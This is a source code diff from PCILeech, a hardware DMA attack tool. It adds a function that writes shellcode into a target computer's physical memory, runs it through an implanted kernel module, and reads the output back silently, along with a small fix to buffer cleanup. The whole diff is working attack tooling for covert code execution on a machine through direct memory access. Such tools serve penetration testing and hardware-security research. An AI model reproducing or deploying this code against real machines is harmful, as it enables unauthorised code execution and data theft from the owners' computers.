@@ -1,6 +1,6 @@
 // executor.c : implementation related 'code execution' and 'console redirect' functionality.
 //
-// (c) Ulf Frisk, 2016
+// (c) Ulf Frisk, 2016, 2017
 // Author: Ulf Frisk, pcileech@frizk.net
 //
 #include "executor.h"
@@ -189,6 +189,65 @@ VOID Exec_CallbackClose(_In_ HANDLE hCallback)
 	LocalFree(ph);
 }
 
+BOOL Exec_ExecSilent(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _In_ LPSTR szShellcodeName, _In_ PBYTE pbIn, _In_ QWORD cbIn, _Out_ PBYTE *ppbOut, _Out_ PQWORD pcbOut)
+{
+	PKMDDATA pk;
+	BOOL result = FALSE;
+	DWORD cbBuffer;
+	PBYTE pbBuffer = NULL;
+	PKMDEXEC pKmdExec = NULL;
+	//------------------------------------------------
+	// 1: Setup and initial validity checks.
+	//------------------------------------------------
+	if(!pDeviceData->KMDHandle) { goto fail; }
+	pk = ((PKMDHANDLE)pDeviceData->KMDHandle)->status;
+	result = Util_LoadKmdExecShellcode(szShellcodeName, &pKmdExec);
+	if(!result) { goto fail; }
+	cbBuffer = SIZE_PAGE_ALIGN_4K(pKmdExec->cbShellcode) + SIZE_PAGE_ALIGN_4K(cbIn);
+	if(!result || (pk->DMASizeBuffer < cbBuffer)) { result = FALSE;  goto fail; }
+	pbBuffer = LocalAlloc(LMEM_ZEROINIT, cbBuffer);
+	if(!pbBuffer) { result = FALSE;  goto fail; }
+	//------------------------------------------------
+	// 2: Set up shellcode and indata and write to target memory.
+	//    X, Y = page aligned.
+	//    [0 , Y       [ = shellcode
+	//    [Y , X       [ = data in (to target computer)
+	//    [X , buf_max [ = data out (from target computer)
+	//------------------------------------------------
+	memcpy(pbBuffer, pKmdExec->pbShellcode, pKmdExec->cbShellcode);
+	memcpy(pbBuffer + SIZE_PAGE_ALIGN_4K(pKmdExec->cbShellcode), pbIn, cbIn);
+	result = DeviceWriteDMA(pDeviceData, pk->DMAAddrPhysical, pbBuffer, cbBuffer, PCILEECH_MEM_FLAG_RETRYONFAIL);
+	if(!result) { goto fail; }
+	pk->dataInExtraOffset = SIZE_PAGE_ALIGN_4K(pKmdExec->cbShellcode);
+	pk->dataInExtraLength = cbIn;
+	pk->dataInExtraLengthMax = SIZE_PAGE_ALIGN_4K(cbIn);
+	pk->dataOutExtraOffset = pk->dataInExtraOffset + pk->dataInExtraLengthMax;
+	pk->dataOutExtraLength = 0;
+	pk->dataOutExtraLengthMax = pk->DMASizeBuffer - pk->dataOutExtraOffset;
+	//------------------------------------------------ 
+	// 3: Execute!
+	//------------------------------------------------
+	KMD_SubmitCommand(pCfg, pDeviceData, pDeviceData->KMDHandle, KMD_CMD_VOID);
+	result = KMD_SubmitCommand(pCfg, pDeviceData, pDeviceData->KMDHandle, KMD_CMD_EXEC);
+	if(!result || pk->dataOut[0] || (pk->dataOutExtraLength > pk->dataOutExtraLengthMax)) {
+		result = FALSE;
+		goto fail;
+	}
+	//------------------------------------------------
+	// 5: Display/Write additional output.
+	//------------------------------------------------
+	if(pcbOut) {
+		*pcbOut = pk->dataOutExtraLength;
+		*ppbOut = (PBYTE)LocalAlloc(0, SIZE_PAGE_ALIGN_4K(*pcbOut));
+		if(!*ppbOut) { result = FALSE; goto fail; }
+		result = DeviceReadDMA(pDeviceData, pk->DMAAddrPhysical + pk->dataOutExtraOffset, *ppbOut, SIZE_PAGE_ALIGN_4K(*pcbOut), 0);
+	}
+fail:
+	LocalFree(pKmdExec);
+	LocalFree(pbBuffer);
+	return result;
+}
+
 VOID ActionExecShellcode(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 {
 	const DWORD CONFIG_SHELLCODE_MAX_BYTES_OUT_PRINT = 8192;
@@ -318,8 +377,8 @@ VOID ActionExecShellcode(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	}
 	printf("\n");
 fail:
-	if(szBufferText) { LocalFree(pKmdExec); }
-	if(szBufferText) { LocalFree(pbBuffer); }
-	if(szBufferText) { LocalFree(szBufferText); }
+	LocalFree(pKmdExec);
+	LocalFree(pbBuffer);
+	LocalFree(szBufferText);
 	if(hFile) { CloseHandle(hFile); }
 }
